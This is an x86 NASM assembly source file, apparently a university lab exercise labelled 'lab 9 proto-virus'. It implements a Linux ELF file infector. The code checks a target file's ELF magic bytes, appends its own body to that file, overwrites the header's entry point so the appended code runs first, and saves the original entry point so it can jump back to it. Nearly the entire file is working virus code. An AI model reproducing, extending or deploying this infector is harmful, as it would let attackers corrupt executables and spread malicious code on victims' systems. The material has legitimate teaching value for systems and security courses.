%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24

%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define FD [ebp]
%define prevEntry [ebp+60]
	global _start

	section .text
_start: 
	push	ebp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	mov	ebp, esp	

	call get_my_loc
	sub ecx, next_i-OutStr
    write 1, ecx, 31			; virus message

	call get_my_loc
	sub ecx, next_i-FileName
	mov FD, ecx

	open FD, RDWR, 0777 		; open ELF file
	cmp eax, 0
	jle ErrorExit					; check that file was opened correctly
	mov FD, eax 				; ebp-4 = fd
	
	lea ecx, [ebp+4]
	read FD, ecx, 52			; read to validate ELf to a "buffer" of 4 bytes at ebp-8
	
	cmp byte[ebp+4], 127
	jne notElf
	cmp byte[ebp+5], 'E'
	jne notElf
	cmp byte[ebp+6], 'L'
	jne notElf
	cmp byte[ebp+7], 'F'
	jne notElf

	lseek FD, 0, 2					; lseek to end of file
	mov [ebp+56], eax 				; ebp-60 = file size

	mov edi, virus_end-_start
	call get_my_loc
	sub ecx, next_i-_start

	write FD, ecx, edi				;add the virus in the end of the file

	lea ecx, [ebp+4+ENTRY]
	mov eax, [ecx]
	mov prevEntry, eax

	mov edi, 0x08048000
	add edi, [ebp+56]

	mov dword [ebp+4+ENTRY], edi	; change entry point


	syscall3 19, FD, 0, 0			; lseek to start of file
	lea ecx, [ebp+4]
	write FD, ecx, 52

	lseek FD, -4, 2
	lea ecx, prevEntry
	write FD, ecx, 4


	close FD
	
ErrorExit:
	call get_my_loc
	sub ecx, next_i-PreviousEntryPoint
	jmp [ecx]

notElf:
	call get_my_loc
	sub ecx,next_i-open_error
    write 1, ecx, 12

VirusExit:
    exit 0       

get_my_loc:
	call next_i

next_i:
	pop ecx
	ret


     ; Termination if all is OK and no previous code to jump to
                      ; (also an example for use of above macros)


FileName:		db "ELFexec", 0
OutStr:			db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
infectionMSG: 	db "Hello, Infected File", 10     ;
check: 			db "this is a check", 10, 0
notAnELF:		db "this is not an elf file", 10, 0
newLine:		db "",10,0	
open_error:		db "Error opening the file", 10, 0

PreviousEntryPoint: dd VirusExit
virus_end:

